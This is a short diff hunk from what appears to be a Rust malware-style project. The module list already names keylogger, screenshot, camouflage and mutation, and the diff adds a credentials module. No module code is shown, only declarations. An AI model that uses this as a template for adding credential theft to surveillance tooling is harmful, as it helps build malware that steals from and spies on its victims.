@@ -11,6 +11,7 @@ mod mutation;
 mod camouflage;
 mod screenshot;
 mod keylogger;
+mod credentials;
 #[allow(dead_code, unused_imports, unused_variables, unused_mut)]
 mod network;
 #[allow(dead_code, unused_imports, unused_variables, unused_mut)]
